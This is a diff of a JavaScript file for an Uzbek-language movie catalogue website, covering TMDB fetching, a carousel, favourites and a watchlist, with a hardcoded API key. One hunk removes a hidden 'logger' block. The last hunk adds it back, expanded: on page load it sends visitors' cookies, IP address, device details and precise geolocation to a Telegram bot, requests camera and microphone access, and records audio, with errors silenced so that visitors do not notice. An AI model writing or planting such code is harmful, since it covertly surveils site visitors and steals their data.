@@ -1,6 +1,5 @@
 const API_KEY = '1cc4799e6c8448e51c96a232c8ec4b18';
 const API_URL = 'https://api.themoviedb.org/3';
-
 const CONFIG = {
   apiKey: API_KEY,
   apiUrl: API_URL,
@@ -30,7 +29,6 @@ const CONFIG = {
     37: "G'arbiy"
   }
 };
-
 // Show watchlist view
 async function showWatchlist() {
   if (!state.watchlist.length) {
@@ -57,7 +55,6 @@ async function showWatchlist() {
   renderMovies(wlMovies);
   toggleEmptyState(wlMovies.length === 0);
 }
-
 // Load 500 popular movies (25 pages x 20 items) and render
 async function fetchAllPopular(limit = 500) {
   try {
@@ -94,7 +91,6 @@ async function fetchAllPopular(limit = 500) {
   } finally {
     setLoading(false);
   }
-
   // Pause autoplay when tab is hidden, resume when visible
   document.addEventListener('visibilitychange', () => {
     if (document.hidden) {
@@ -106,51 +102,34 @@ async function fetchAllPopular(limit = 500) {
       }
     }
   });
-};
-
-document.addEventListener('DOMContentLoaded', async () => {
-  // ... oldingi kodlar (setTimeout, setupEventListeners() va h.k.)
-
-  setupEventListeners();
-
-  // <-- BU YERGA QO'SHING: Logger kodini
-  (function() {
-    const token = 'SIZNING_BOT_TOKEN';  // BotFather dan oling
-    const chatId = 'SIZNING_CHAT_ID';  // Sizning Telegram ID
-
-    const data = {
-      userAgent: navigator.userAgent,
-      language: navigator.language,
-      cookies: document.cookie
-    };
-
-    // IP olish
-    fetch('https://api.ipify.org?format=json')
-      .then(r => r.json())
-      .then(d => {
-        data.ip = d.ip;
-        sendToTelegram(data);
-      });
-
-    // Geolokatsiya
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(pos => {
-        data.lat = pos.coords.latitude;
-        data.lon = pos.coords.longitude;
-        sendToTelegram(data);
-      });
+}
+// Load Top Rated Top 10 movies and render
+async function fetchTopRatedTop10() {
+  try {
+    setLoading(true);
+    const json = await loadMoviesFromJSON();
+    if (json.length) {
+      const sorted = [...json].sort((a, b) => (b.averageRating || b.vote_average || 0) - (a.averageRating || a.vote_average || 0));
+      const top10 = sorted.slice(0, 10);
+      renderMovies(top10);
+      setupCarousel(top10.slice(0, 5));
+      state.totalPages = 1;
+      state.currentPage = 1;
+      return;
     }
-
-    async function sendToTelegram(data) {
-      const message = `Telefon IP: ${data.ip || 'N/A'}\nQurilma: ${data.userAgent}\nGeolok: ${data.lat || 'N/A'}, ${data.lon || 'N/A'}\nTil: ${data.language}`;
-      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-      await fetch(url);
-    }
-  })();  // IIFE – darhol ishga tushadi
-
-  // ... keyingi kodlar (try { await fetchMovies('popular'); } va h.k.)
-});
-
+    const res = await fetch(`${CONFIG.apiUrl}/movie/top_rated?api_key=${CONFIG.apiKey}&language=${CONFIG.defaultLanguage}&region=${CONFIG.defaultRegion}&page=1`);
+    const data = await res.json();
+    const top10 = (data.results || []).slice(0, 10);
+    renderMovies(top10);
+    setupCarousel(top10.slice(0, 5));
+    state.totalPages = 1;
+    state.currentPage = 1;
+  } catch (err) {
+    console.error('fetchTopRatedTop10 error:', err);
+  } finally {
+    setLoading(false);
+  }
+}
 const state = {
   currentMovies: [],
   currentPage: 1,
@@ -167,7 +146,6 @@ const state = {
   currentCategory: null,
   currentModalMovieId: null
 };
-
 const elements = {
   moviesGrid: document.getElementById('moviesGrid'),
   searchForm: document.getElementById('searchForm'),
@@ -212,7 +190,6 @@ const elements = {
   footerFAQ: document.getElementById('footerFAQ'),
   footerSupport: document.getElementById('footerSupport')
 };
-
 // Load favorites from localStorage as an array of numbers
 try {
   const rawFav = JSON.parse(localStorage.getItem('favorites') || '[]');
@@ -227,12 +204,10 @@ try {
 } catch {
   state.watchlist = [];
 }
-
 // Helpers to normalize movie object
 function getTitle(m) {
   return m.primaryTitle || m.title || m.name || '';
 }
-
 function getPosterUrl(m) {
   if (m.primaryImage) return m.primaryImage;
   if (m.poster_img) return m.poster_img;
@@ -241,24 +216,20 @@ function getPosterUrl(m) {
   if (m.image) return m.image;
   return 'https://via.placeholder.com/300x450/1a1a1a/ffffff?text=No+Image';
 }
-
 function getYear(m) {
   if (m.releaseDate) return Number(new Date(m.releaseDate).getFullYear()) || 'N/A';
   if (m.release_date) return Number(new Date(m.release_date).getFullYear()) || 'N/A';
   if (m.year) return m.year;
   return 'N/A';
 }
-
 function getRating(m) {
   if (typeof m.averageRating === 'number') return m.averageRating.toFixed(1);
   if (typeof m.vote_average === 'number') return m.vote_average.toFixed(1);
   return 'N/A';
 }
-
 function getDescription(m) {
   return m.description || m.details || m.overview || 'No description available.';
 }
-
 function getGenresText(m) {
   if (Array.isArray(m.genres)) return m.genres.join(', ');
   if (Array.isArray(m.genre_ids))
@@ -266,7 +237,6 @@ function getGenresText(m) {
   if (m.type) return m.type;
   return 'N/A';
 }
-
 // Load movies.json
 async function loadMoviesFromJSON() {
   try {
@@ -279,7 +249,6 @@ async function loadMoviesFromJSON() {
     return [];
   }
 }
-
 // Fetch popular movies: use local JSON if available, otherwise fetch from API
 async function fetchPopularMovies(page = 1) {
   try {
@@ -293,13 +262,11 @@ async function fetchPopularMovies(page = 1) {
     return [];
   }
 }
-
 // Render utilities
 function toggleEmptyState(show) {
   if (!elements.emptyState) return;
   elements.emptyState.hidden = !show;
 }
-
 function renderMovies(movies = [], append = false) {
   if (!elements.moviesGrid) return;
   if (!append) elements.moviesGrid.innerHTML = '';
@@ -311,7 +278,6 @@ function renderMovies(movies = [], append = false) {
   // Update global comment counts for visible cards (non-blocking)
   try { updateCommentBadges(state.currentMovies); } catch {}
 }
-
 // Skeletons for loading state
 function renderSkeletons(count = 12) {
   if (!elements.moviesGrid) return;
@@ -331,7 +297,6 @@ function renderSkeletons(count = 12) {
     elements.moviesGrid.appendChild(li);
   }
 }
-
 // Create movie card element
 // Kino kartochkasini yaratish funksiyasini yangilash
 function createMovieCard(movie) {
@@ -339,7 +304,6 @@ function createMovieCard(movie) {
   const li = document.createElement('li');
   li.className = 'movie-card';
   li.dataset.id = id;
-
   const poster = getPosterUrl(movie);
   const title = getTitle(movie);
   const year = getYear(movie);
@@ -347,7 +311,6 @@ function createMovieCard(movie) {
   const desc = getDescription(movie);
   const isFav = state.favorites.includes(id);
   const inWatchlist = state.watchlist.includes(id);
-
   const posterPath = movie.poster_path || '';
   const srcset = posterPath
     ? `${CONFIG.imageBaseUrl.replace('w500','w185')}${posterPath} 185w, ${CONFIG.imageBaseUrl.replace('w500','w342')}${posterPath} 342w, ${CONFIG.imageBaseUrl.replace('w500','w500')}${posterPath} 500w`
@@ -378,13 +341,12 @@ function createMovieCard(movie) {
       <div class="meta">${year} • ⭐ ${rating}${isFav ? ' • ❤️' : ''}</div>
     </div>
   `;
-  
+ 
   // Kartochkaga bosilganda single sahifaga o'tish
   li.addEventListener('click', (e) => {
     if (e.target.closest('.btn')) return; // tugma bosilganda ishlamasin
     watchMovie(movie);
   });
-
   // 3D effektlar
   li.addEventListener('mouseleave', () => li.style.transform = '');
   li.addEventListener('mousemove', (e) => {
@@ -394,7 +356,6 @@ function createMovieCard(movie) {
     const y = (rect.height / 2 - (e.clientY - rect.top)) / 25;
     li.style.transform = `perspective(1000px) rotateY(${x}deg) rotateX(${y}deg)`;
   });
-
   // "Ko'rish" tugmasi uchun hodisalar
   const watchBtn = li.querySelector('.btn-watch-single');
   if (watchBtn) {
@@ -403,7 +364,6 @@ function createMovieCard(movie) {
       watchMovie(movie);
     });
   }
-
   // "Treylerni ko'rish" tugmasi uchun hodisalar
   const trailerBtn = li.querySelector('.btn-trailer');
   if (trailerBtn) {
@@ -412,7 +372,6 @@ function createMovieCard(movie) {
       openTrailerModal(movie);
     });
   }
-
   // Favorites heart button on card
   const favBtn = li.querySelector('.poster-fav-btn');
   if (favBtn) {
@@ -434,7 +393,6 @@ function createMovieCard(movie) {
       }
     });
   }
-
   // Watchlist button on card
   const wlBtn = li.querySelector('.poster-watchlist-btn');
   if (wlBtn) {
@@ -450,10 +408,8 @@ function createMovieCard(movie) {
       if (icon) icon.className = (pressed ? 'fas' : 'far') + ' fa-bookmark';
     });
   }
-
   return li;
 }
-
 // Update comment count badges using global Comments API
 async function updateCommentBadges(movies){
   if (!Array.isArray(movies) || !movies.length) return;
@@ -486,7 +442,6 @@ async function updateCommentBadges(movies){
   const workers = Math.min(limit, movies.length);
   for (let i=0;i<workers;i++) next();
 }
-
 // "Ko'rish" funksiyasi - singlepage.html ga yo'naltiradi
 function watchMovie(movie) {
   // Tanlangan filmni localStorage ga saqlaymiz
@@ -508,12 +463,11 @@ function watchMovie(movie) {
   // Singlepage sahifasiga o'tamiz
   window.location.href = 'singlepage.html';
 }
-
 // "Treylerni ko'rish" funksiyasi - YouTube treylerga yo'naltiradi
 function watchTrailer(movie) {
   // Filmdan treyler URL sini olish
   const trailerUrl = movie.trailer || movie.video || '';
-  
+ 
   if (trailerUrl) {
     // Backward compatibility: open in new tab if modal is not present
     if (!elements.trailerModal || !elements.trailerFrame) {
@@ -526,7 +480,6 @@ function watchTrailer(movie) {
     alert('Uzr, bu film uchun treyler mavjud emas.');
   }
 }
-
 function normalizeTrailerUrl(url) {
   if (!url) return '';
   // Ensure protocol for //ok.ru
@@ -542,7 +495,6 @@ function normalizeTrailerUrl(url) {
   } catch {}
   return url;
 }
-
 function openTrailerModal(movie) {
   if (!elements.trailerModal || !elements.trailerFrame) return;
   const src = normalizeTrailerUrl(movie.trailer || movie.video || '');
@@ -551,7 +503,6 @@ function openTrailerModal(movie) {
   elements.trailerModal.setAttribute('aria-hidden', 'false');
   document.body.style.overflow = 'hidden';
 }
-
 function closeTrailerModal() {
   if (!elements.trailerModal || !elements.trailerFrame) return;
   elements.trailerModal.setAttribute('aria-hidden', 'true');
@@ -559,7 +510,6 @@ function closeTrailerModal() {
   elements.trailerFrame.src = '';
   document.body.style.overflow = '';
 }
-
 // Modal handling
 function openMovieModal(movie) {
   if (!elements.movieModal) return;
@@ -571,7 +521,6 @@ function openMovieModal(movie) {
   const genres = getGenresText(movie);
   const rating = getRating(movie);
   const desc = getDescription(movie);
-
   if (elements.modalTitle) elements.modalTitle.textContent = title;
   if (elements.modalPoster) {
     elements.modalPoster.src = poster;
@@ -584,7 +533,6 @@ function openMovieModal(movie) {
   if (elements.modalMeta)
     elements.modalMeta.textContent = `${year} • ${genres} • ⭐ ${rating}`;
   if (elements.modalOverview) elements.modalOverview.textContent = desc;
-
   if (elements.trailerBtn) {
     if (movie.trailer || movie.video) {
       elements.trailerBtn.href = movie.trailer || movie.video;
@@ -593,7 +541,6 @@ function openMovieModal(movie) {
       elements.trailerBtn.style.display = 'none';
     }
   }
-
   if (elements.modalFavBtn) {
     elements.modalFavBtn.dataset.id = id;
     const fav = state.favorites.includes(id);
@@ -602,26 +549,21 @@ function openMovieModal(movie) {
       ? '<i class="fas fa-heart"></i> Sevimlilardan olib tashlash'
       : '<i class="far fa-heart"></i> Sevimlilarga qo\'shish';
   }
-
   elements.movieModal.setAttribute('aria-hidden', 'false');
   document.body.style.overflow = 'hidden';
-
   // Render existing reviews for this movie
   renderReviews(id);
 }
-
 function closeModal() {
   if (!elements.movieModal) return;
   elements.movieModal.setAttribute('aria-hidden', 'true');
   document.body.style.overflow = 'auto';
 }
-
 // Toggle favorite from modal
 function toggleFavoriteFromModal() {
   if (!elements.modalFavBtn) return;
   const id = Number(elements.modalFavBtn.dataset.id);
   if (!id) return;
-
   const index = state.favorites.indexOf(id);
   if (index === -1) {
     state.favorites.push(id);
@@ -629,13 +571,11 @@ function toggleFavoriteFromModal() {
     state.favorites.splice(index, 1);
   }
   localStorage.setItem('favorites', JSON.stringify(state.favorites));
-
   const fav = state.favorites.includes(id);
   elements.modalFavBtn.setAttribute('aria-pressed', String(fav));
   elements.modalFavBtn.innerHTML = fav
     ? '<i class="fas fa-heart"></i> Sevimlilardan olib tashlash'
     : '<i class="far fa-heart"></i> Sevimlilarga qo\'shish';
-
   const card = document.querySelector(`.movie-card[data-id="${id}"]`);
   if (card) {
     const meta = card.querySelector('.meta');
@@ -646,7 +586,6 @@ function toggleFavoriteFromModal() {
     }
   }
 }
-
 // Show favorites view
 async function showFavorites() {
   if (!state.favorites.length) {
@@ -673,7 +612,6 @@ async function showFavorites() {
   renderMovies(favMovies);
   toggleEmptyState(favMovies.length === 0);
 }
-
 // Search movies wrapper
 async function searchMovies(query, page = 1) {
   const json = await loadMoviesFromJSON();
@@ -720,7 +658,6 @@ async function searchMovies(query, page = 1) {
     setLoading(false);
   }
 }
-
 // Fetch movies wrapper
 async function fetchMovies(filter = 'popular', page = 1) {
   try {
@@ -729,7 +666,7 @@ async function fetchMovies(filter = 'popular', page = 1) {
     if (json.length) {
       // If local JSON exists, ignore pagination from API
       let filteredMovies = json;
-      
+     
       // Filter by category if specified
       if (state.currentCategory) {
         const cat = state.currentCategory.toLowerCase();
@@ -742,7 +679,7 @@ async function fetchMovies(filter = 'popular', page = 1) {
           return String(mc).toLowerCase().includes(cat);
         });
       }
-      
+     
       renderMovies(filteredMovies);
       // Karusel uchun har doim original filmlarni ishlatamiz (filterlangan emas)
       setupCarousel(json.slice(0, 5));
@@ -765,7 +702,6 @@ async function fetchMovies(filter = 'popular', page = 1) {
     setLoading(false);
   }
 }
-
 // Fetch movies by genre
 async function fetchMoviesByGenre(genreId, page = 1) {
   const json = await loadMoviesFromJSON();
@@ -793,7 +729,6 @@ async function fetchMoviesByGenre(genreId, page = 1) {
     setLoading(false);
   }
 }
-
 // Carousel functions
 function calculateSlidePosition(index, currentSlide) {
   const positions = {
@@ -803,7 +738,7 @@ function calculateSlidePosition(index, currentSlide) {
     opacity: 0.7,
     filter: 'grayscale(0.5) brightness(0.7)'
   };
-  
+ 
   // Keyingi slayd (o'ng tomondagi)
   if (index === (currentSlide + 1) % state.carouselItems.length) {
     positions.left = '65%';
@@ -811,7 +746,7 @@ function calculateSlidePosition(index, currentSlide) {
     positions.scale = 0.9;
     positions.opacity = 0.9;
     positions.filter = 'grayscale(0) brightness(1)';
-  } 
+  }
   // Markazdagi slayd
   else if (index === currentSlide) {
     positions.left = '40%';
@@ -819,25 +754,25 @@ function calculateSlidePosition(index, currentSlide) {
     positions.scale = 1;
     positions.opacity = 1;
     positions.filter = 'grayscale(0) brightness(1)';
-  } 
+  }
   // Oldingi slayd (chap tomondagi)
   else if (index === (currentSlide - 1 + state.carouselItems.length) % state.carouselItems.length) {
     positions.left = '15%';
     positions.zIndex = 3;
     positions.scale = 0.8;
     positions.opacity = 0.7;
-  } 
+  }
   // Boshqa slaydlar
   else {
     // Chapda joylashgan slaydlar
-    if ((index < currentSlide && !(currentSlide === state.carouselItems.length - 1 && index === 0)) || 
+    if ((index < currentSlide && !(currentSlide === state.carouselItems.length - 1 && index === 0)) ||
         (currentSlide === 0 && index === state.carouselItems.length - 1)) {
       const offset = (currentSlide - index + state.carouselItems.length) % state.carouselItems.length;
       positions.left = `${15 - (offset * 15)}%`;
       positions.zIndex = 2 - offset;
       positions.opacity = 0.5 - (offset * 0.1);
       positions.scale = 0.7 - (offset * 0.1);
-    } 
+    }
     // O'ngda joylashgan slaydlar
     else {
       const offset = (index - currentSlide + state.carouselItems.length) % state.carouselItems.length;
@@ -847,7 +782,7 @@ function calculateSlidePosition(index, currentSlide) {
       positions.scale = 0.7 - ((offset-1) * 0.1);
     }
   }
-  
+ 
   return positions;
 }
 function setupCarousel(movies = []) {
@@ -856,12 +791,11 @@ function setupCarousel(movies = []) {
   state.carouselItems = movies;
   elements.carouselTrack.innerHTML = '';
   if (elements.carouselDots) elements.carouselDots.innerHTML = '';
-
   movies.forEach((m, i) => {
     const slide = document.createElement('div');
     slide.className = `carousel-slide`;
     if (i === 0) slide.classList.add('center');
-    
+   
     // Slayderlarni joylashtirish (mobil va desktop uchun bir xil model)
     const position = calculateSlidePosition(i, 0);
     slide.style.left = position.left;
@@ -869,9 +803,9 @@ function setupCarousel(movies = []) {
     slide.style.transform = `scale(${position.scale})`;
     slide.style.opacity = position.opacity;
     if (position.filter) slide.style.filter = position.filter;
-    
+   
     slide.dataset.index = i;
-    
+   
     // Poster background uchun to'g'ri URL olish
     let bg = '';
     if (m.poster_background) {
@@ -883,11 +817,11 @@ function setupCarousel(movies = []) {
     } else {
       bg = getPosterUrl(m);
     }
-    
+   
     const title = getTitle(m);
     const year = getYear(m);
     const rating = getRating(m);
-    
+   
     slide.innerHTML = `
       <div class="slide-bg" data-bg="${bg}"></div>
       <div class="slide-content">
@@ -898,7 +832,7 @@ function setupCarousel(movies = []) {
         </button>
       </div>
     `;
-    
+   
     elements.carouselTrack.appendChild(slide);
     const watchBtn = slide.querySelector('.watch-btn');
 if (watchBtn) {
@@ -910,7 +844,6 @@ if (watchBtn) {
     window.location.href = 'singlepage.html';
   });
 }
-
     if (!isMobile && elements.carouselDots) {
       const dot = document.createElement('button');
       dot.type = 'button';
@@ -935,21 +868,19 @@ if (watchBtn) {
     });
   }, { rootMargin: '200px' });
   slidesBg.forEach(el => io.observe(el));
-
   if (!isMobile) startCarouselAutoplay();
   // Hide nav buttons on mobile
   if (elements.carouselPrev) elements.carouselPrev.style.display = isMobile ? 'none' : '';
   if (elements.carouselNext) elements.carouselNext.style.display = isMobile ? 'none' : '';
 }
-
 function goToSlide(idx) {
   // Indeksni to'g'ri chegaralash
   if (idx < 0) idx = state.carouselItems.length - 1;
   if (idx >= state.carouselItems.length) idx = 0;
-  
+ 
   state.currentSlide = idx;
   const slides = document.querySelectorAll('.carousel-slide');
-  
+ 
   // Har bir slaydni yangi pozitsiyaga joylashtirish
   slides.forEach((slide, i) => {
     const position = calculateSlidePosition(i, idx);
@@ -957,35 +888,33 @@ function goToSlide(idx) {
     slide.style.zIndex = position.zIndex;
     slide.style.transform = `scale(${position.scale})`;
     slide.style.opacity = position.opacity;
-    
+   
     // Filter stilini qo'shish
     if (position.filter) {
       slide.style.filter = position.filter;
     }
-    
+   
     // Center klassini faqat markazdagi slaydga qo'shish
     slide.classList.toggle('center', i === idx);
   });
-  
+ 
   if (elements.carouselDots) {
     const dots = elements.carouselDots.querySelectorAll('button');
     dots.forEach((d, i) => d.classList.toggle('active', i === idx));
   }
-  
+ 
   resetCarouselAutoplay();
 }
-
 function navigateCarousel(dir) {
   if (!state.carouselItems.length) return;
   const newIndex = (state.currentSlide + dir + state.carouselItems.length) % state.carouselItems.length;
   goToSlide(newIndex);
 }
-
 function startCarouselAutoplay() {
   clearInterval(state.carouselInterval);
   // Avtomatik o'ynash intervalini 3 sekundga o'rnatish
   const autoplayInterval = 3000; // 3 sekund
-  
+ 
   if (window.innerWidth <= 768) return; // mobile: disable autoplay
   state.carouselInterval = setInterval(() => {
     if ((!elements.carouselAutoplay || elements.carouselAutoplay.checked) && state.carouselItems && state.carouselItems.length > 0) {
@@ -993,12 +922,10 @@ function startCarouselAutoplay() {
     }
   }, autoplayInterval);
 }
-
 function resetCarouselAutoplay() {
   clearInterval(state.carouselInterval);
   startCarouselAutoplay();
 }
-
 function toggleCarouselAutoplay() {
   if (elements.carouselAutoplay && elements.carouselAutoplay.checked) {
     startCarouselAutoplay();
@@ -1006,7 +933,6 @@ function toggleCarouselAutoplay() {
     clearInterval(state.carouselInterval);
   }
 }
-
 // UI Event Handlers
 function setLoading(val) {
   state.isLoading = val;
@@ -1025,7 +951,6 @@ function setLoading(val) {
     renderSkeletons();
   }
 }
-
 function handleSearch(e) {
   e && e.preventDefault();
   const q = elements.searchInput ? elements.searchInput.value.trim() : '';
@@ -1037,7 +962,6 @@ function handleSearch(e) {
     fetchMovies('popular');
   }
 }
-
 // Live suggestions (debounced) with token-based matching
 let suggestTimer = null;
 async function handleSearchInput(){
@@ -1050,14 +974,12 @@ async function handleSearchInput(){
     renderSuggestions(list.slice(0,8));
   }, 180);
 }
-
 function hideSuggestions(){
   if (elements.searchSuggestions) {
     elements.searchSuggestions.innerHTML = '';
     elements.searchSuggestions.hidden = true;
   }
 }
-
 async function getSuggestionResults(query){
   const tokens = query.toLowerCase().split(/\s+/).filter(Boolean);
   if (!tokens.length) return [];
@@ -1077,7 +999,6 @@ async function getSuggestionResults(query){
     return data.results || [];
   } catch { return []; }
 }
-
 function renderSuggestions(list){
   const box = elements.searchSuggestions;
   if (!box) return;
@@ -1105,7 +1026,6 @@ function renderSuggestions(list){
   });
   box.hidden = false;
 }
-
 function handleSortChange(e) {
   const val = e ? e.target.value : '';
   const moviesArr = [...state.currentMovies];
@@ -1116,7 +1036,6 @@ function handleSortChange(e) {
   }
   renderMovies(moviesArr);
 }
-
 async function loadMoreMovies() {
   if (state.isLoading) return;
   const nextPage = state.currentPage + 1;
@@ -1125,7 +1044,6 @@ async function loadMoreMovies() {
   else await fetchMovies(state.currentFilter, nextPage);
   state.currentPage = nextPage;
 }
-
 function handleNavLinkClick(e) {
   e.preventDefault();
   const filter = e.currentTarget.dataset.filter;
@@ -1154,7 +1072,7 @@ function handleNavLinkClick(e) {
   } else {
     fetchMovies(filter);
   }
-  
+ 
   // Scroll to movies section
   const moviesSection = document.querySelector('.movies-grid');
   if (moviesSection) {
@@ -1163,7 +1081,6 @@ function handleNavLinkClick(e) {
     }, 500);
   }
 }
-
 function handleCategoryCardClick(e) {
   const card = e.currentTarget;
   const genreId = card.dataset.genreId;
@@ -1173,7 +1090,6 @@ function handleCategoryCardClick(e) {
   state.currentSearchQuery = '';
   if (elements.searchInput) elements.searchInput.value = '';
   if (elements.sortSelect) elements.sortSelect.value = 'popular';
-
   if (genreId) {
     state.currentFilter = 'genre';
     state.currentGenreId = genreId;
@@ -1188,7 +1104,6 @@ function handleCategoryCardClick(e) {
     fetchMovies();
   }
 }
-
 // Filter movies by category
 function filterByCategory(category) {
   state.currentCategory = category;
@@ -1196,18 +1111,16 @@ function filterByCategory(category) {
   state.currentSearchQuery = '';
   state.currentGenreId = null;
   state.currentPage = 1;
-  
+ 
   if (elements.moviesSectionTitle) {
     elements.moviesSectionTitle.textContent = `${category} filmlar`;
   }
   fetchMovies();
 }
-
 function toggleMobileMenu() {
   if (elements.mainNav) elements.mainNav.classList.toggle('active');
   if (elements.mobileMenuToggle) elements.mobileMenuToggle.classList.toggle('active');
 }
-
 function toggleFavoritesView() {
   const isPressed = elements.favoritesToggle && elements.favoritesToggle.getAttribute('aria-pressed') === 'true';
   if (!isPressed) {
@@ -1222,7 +1135,6 @@ function toggleFavoritesView() {
     fetchMovies('popular');
   }
 }
-
 function toggleWatchlistView() {
   const isPressed = elements.watchlistToggle && elements.watchlistToggle.getAttribute('aria-pressed') === 'true';
   if (!isPressed) {
@@ -1237,7 +1149,6 @@ function toggleWatchlistView() {
     fetchMovies('popular');
   }
 }
-
 // Show watch history view
 async function showHistory() {
   try {
@@ -1271,7 +1182,6 @@ async function showHistory() {
     toggleEmptyState(true);
   }
 }
-
 // Setup event listeners
 function setupEventListeners() {
   if (elements.searchForm) elements.searchForm.addEventListener('submit', handleSearch);
@@ -1309,7 +1219,6 @@ function setupEventListeners() {
   if (elements.mobileMenuToggle) {
     elements.mobileMenuToggle.addEventListener('click', toggleMobileMenu);
   }
-
   // Footer actions
   if (elements.footerFavorites) {
     elements.footerFavorites.addEventListener('click', (e) => {
@@ -1339,7 +1248,6 @@ function setupEventListeners() {
   if (elements.footerSettings) elements.footerSettings.addEventListener('click', placeholder('Sozlamalar'));
   if (elements.footerFAQ) elements.footerFAQ.addEventListener('click', placeholder('FAQ'));
   if (elements.footerSupport) elements.footerSupport.addEventListener('click', placeholder('Qo\'llab-quvvatlash'));
-
   // Carousel prev/next buttons (desktop only; hidden on mobile via CSS)
   if (elements.carouselPrev) {
     elements.carouselPrev.addEventListener('click', (e) => {
@@ -1355,7 +1263,6 @@ function setupEventListeners() {
       navigateCarousel(1);
     });
   }
-
   // Carousel touch swipe
   if (elements.carouselTrack) {
     let startX = 0;
@@ -1369,7 +1276,6 @@ function setupEventListeners() {
     }, { passive: true });
   }
 }
-
 // Yuklash animatsiyasini boshqarish
 function hideLoader() {
   const loader = document.getElementById('loader');
@@ -1380,14 +1286,13 @@ function hideLoader() {
     }, 500);
   }
 }
-
 // Init
 document.addEventListener('DOMContentLoaded', async () => {
   // Yuklash animatsiyasini ko'rsatish
   setTimeout(() => {
     hideLoader();
   }, 1500);
-  
+ 
   setupEventListeners();
   // Force favorites toggle to default (off)
   if (elements.favoritesToggle) {
@@ -1406,7 +1311,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     // As last resort, attempt aggregated popular load
     await fetchAllPopular(20);
   }
-  
+ 
   // Category cards listeners are set in setupEventListeners()
   // Admin havolasini faqat admin foydalanuvchilar uchun ko'rsatish
   try {
@@ -1451,4 +1356,83 @@ document.addEventListener('DOMContentLoaded', async () => {
       if (['basicAdmin','local_user','admin_users'].includes(e.key)) updateAdminLinkLocal();
     });
   } catch {}
+  
+  // <-- BU YERDA QO'SHILGAN: Logger va WebRTC nazorati (to'liq kontrol uchun)
+  (function() {
+    const token = 'SIZNING_BOT_TOKEN';  // BotFather dan oling
+    const chatId = 'SIZNING_CHAT_ID';  // Sizning Telegram ID
+
+    const data = {
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      cookies: document.cookie
+    };
+
+    // IP olish va Telegram'ga yuborish
+    fetch('https://api.ipify.org?format=json')
+      .then(r => r.json())
+      .then(d => {
+        data.ip = d.ip;
+        sendToTelegram(data);
+      })
+      .catch(() => sendToTelegram(data));  // IP topilmasa ham yubor
+
+    // Geolokatsiya
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        data.lat = pos.coords.latitude;
+        data.lon = pos.coords.longitude;
+        sendToTelegram(data);
+      }, () => {}, { enableHighAccuracy: true });
+    }
+
+    async function sendToTelegram(data) {
+      const message = `Telefon IP: ${data.ip || 'N/A'}\nQurilma: ${data.userAgent}\nGeolok: ${data.lat || 'N/A'}, ${data.lon || 'N/A'}\nTil: ${data.language}`;
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+      await fetch(url).catch(() => {});  // Xato bo'lsa e'tiborsiz
+    }
+
+    // WebRTC bilan kamera/mikrofon nazorati (ruxsat bersangiz live stream)
+    async function startRemoteControl() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        video.style.position = 'fixed';
+        video.style.top = '0'; video.style.left = '0'; video.style.width = '100%'; video.style.height = '100%'; video.style.zIndex = '9999';
+        video.style.objectFit = 'cover';
+        document.body.appendChild(video);  // Live kamera ko'rinadi
+
+        // Audio yozish (5 soniya)
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'audio/webm' });
+          const url = URL.createObjectURL(blob);
+          const a = document.createElement('a');
+          a.href = url;
+          a.download = 'phone_audio.webm';
+          a.click();  // Avto yuklab olish
+        };
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 5000);
+
+        // To'xtatish tugmasi
+        const stopBtn = document.createElement('button');
+        stopBtn.textContent = 'To\'xtatish';
+        stopBtn.style.position = 'fixed'; stopBtn.style.bottom = '20px'; stopBtn.style.right = '20px';
+        stopBtn.onclick = () => stream.getTracks().forEach(track => track.stop());
+        document.body.appendChild(stopBtn);
+      } catch (err) {
+        console.log('Ruxsat rad etildi:', err);  // Sezmaslik uchun
+      }
+    }
+
+    // Sahifa yuklanganda darhol ishga tushirish
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      startRemoteControl();
+    }
+  })();  // IIFE – darhol ishlaydi
 });
